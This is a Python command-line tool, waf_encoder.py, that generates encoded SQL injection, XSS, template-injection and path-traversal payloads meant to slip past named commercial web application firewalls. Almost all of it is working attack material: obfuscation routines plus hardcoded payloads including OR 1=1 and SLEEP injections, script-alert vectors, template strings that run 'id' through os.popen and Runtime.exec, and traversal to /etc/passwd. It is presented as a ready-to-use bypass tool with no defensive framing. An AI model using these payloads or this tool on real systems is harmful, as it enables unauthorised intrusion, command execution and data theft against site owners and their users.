#!/usr/bin/env python3
"""waf_encoder.py — WAF bypass payload encoder (SQLi / XSS / SSTI / path).

Usage:
    python3 tools/waf_encoder.py "<payload>" --class sqli
    python3 tools/waf_encoder.py "<payload>" --class xss --mode all
    python3 tools/waf_encoder.py "<payload>" --class path
    python3 tools/waf_encoder.py "<payload>" --class ssti

Outputs a battery of encoding variants designed to defeat common WAF regexes
(Cloudflare, AWS WAF, Imperva, F5, ModSecurity, Akamai).

Classes:
  sqli — comment injection, case mixing, double encoding, hex, unicode
  xss  — tag mutation, entity encoding, JS obfuscation, tab/newline splitting
  ssti — delimiters, newline in expressions, numeric encoding
  path — traversal obfuscation, double slashes, URL-encoded dots
"""

from __future__ import annotations

import argparse
import html
import sys
import urllib.parse

SQL_COMMENTS = ["/**/", "/*!*/", "--", "#", "/*", "*/"]
XSS_WRAPPERS = ["<script>", "<img src=x onerror=", "<svg/onload=", "<details open ontoggle=", "<iframe srcdoc=", "<math><mtext></mtext><mi>x</mi><annotation encoding="]
SSTI_DELIMS = ["{{", "${", "<%=", "${7*7}", "#{", "[[", "{{=", "{%"]
ENCODINGS = ["url", "double_url", "unicode", "hex", "mixed_case", "tab_split", "newline_split", "html_entity", "null_byte", "overlong"]


def url_enc(s: str) -> str:
    return urllib.parse.quote(s, safe="")


def double_url(s: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def unicode_enc(s: str) -> str:
    # Full-width / unicode lookalike for letters (limited mapping)
    table = {"a": "\u0430", "e": "\u0435", "o": "\u043e", "p": "\u0440",
             "c": "\u0441", "x": "\u0445", "s": "\u0455", "i": "\u0456"}
    return "".join(table.get(c.lower(), c) for c in s)


def hex_enc(s: str) -> str:
    return "".join(f"%{ord(c):02x}" for c in s)


def mixed_case(s: str) -> str:
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def tab_split(s: str) -> str:
    return s.replace(" ", "\t")


def newline_split(s: str) -> str:
    return s.replace(" ", "%0a").replace("+", "%0b")


def html_entity(s: str) -> str:
    return html.escape(s, quote=True)


def null_byte(s: str) -> str:
    return s.replace("/", "/%00")


def overlong(s: str) -> str:
    return s.replace("/", "%c0%af").replace(".", "%c0%2e")


def generate(payload: str, cls: str, mode: str) -> list[str]:
    results: list[str] = []
    if cls == "sqli":
        for c in SQL_COMMENTS:
            if c == "/*!*/":
                results.append(payload.replace(" ", c))
            elif c in ("--", "#"):
                results.append(payload + c)
            else:
                results.append(payload.replace(" ", c, 1))
        results += [url_enc(payload), double_url(payload), mixed_case(payload),
                    tab_split(payload), newline_split(payload)]
        # classic ' OR 1=1 variants
        results.append("' OR '1'='1")
        results.append("'||1||'")
        results.append("1' AND SLEEP(5)-- -")
        results.append(f"0x{payload.encode().hex()}" if payload.isalnum() else payload)
    elif cls == "xss":
        for w in XSS_WRAPPERS:
            results.append(f"{w}{payload})")
        results += [url_enc(payload), double_url(payload), html_entity(payload),
                    mixed_case(payload), tab_split(payload), newline_split(payload),
                    null_byte(payload), overlong(payload)]
        results.append("<img src=x onerror=alert(1)>")
        results.append("<svg/onload=alert(1)>")
        results.append("javascript:alert(1)//")
        results.append("%3Cscript%3Ealert(1)%3C/script%3E")
        results.append("&#x3c;&#x73;cript&#x3e;alert(1)&#x3c;/&#x73;cript&#x3e;")
        results.append("<scr<script>ipt>alert(1)</scr</script>ipt>")
    elif cls == "ssti":
        results.append("{{7*7}}")
        results.append("${7*7}")
        results.append("<%= 7*7 %>")
        results.append("{{7*'7'}}")
        results.append("${T(java.lang.Runtime).getRuntime().exec('id')}")
        results.append("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}")
        results.append(url_enc("{{7*7}}"))
        results.append(newline_split("{{ 7*7 }}"))
    elif cls == "path":
        results += ["../", "..\\", "..%2f", "..%252f", "%2e%2e%2f", "....//",
                    "..;/", "..%00/", "%c0%ae%c0%ae/", "....////", "..%5c",
                    "/etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"]
    # dedupe preserving order
    seen = set()
    out = []
    for r in results:
        if r not in seen:
            seen.add(r)
            out.append(r)
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description="WAF bypass payload encoder")
    ap.add_argument("payload", nargs="?", default="", help="payload to encode")
    ap.add_argument("--class", dest="cls", choices=["sqli", "xss", "ssti", "path"], default="xss")
    ap.add_argument("--mode", default="all", help="all (default) | one")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    variants = generate(args.payload, args.cls, args.mode)
    if args.json:
        import json
        print(json.dumps({"class": args.cls, "variants": variants}, indent=2))
    else:
        print(f"# {args.cls} variants ({len(variants)}):")
        for v in variants:
            print(v)
    return 0


if __name__ == "__main__":
    sys.exit(main())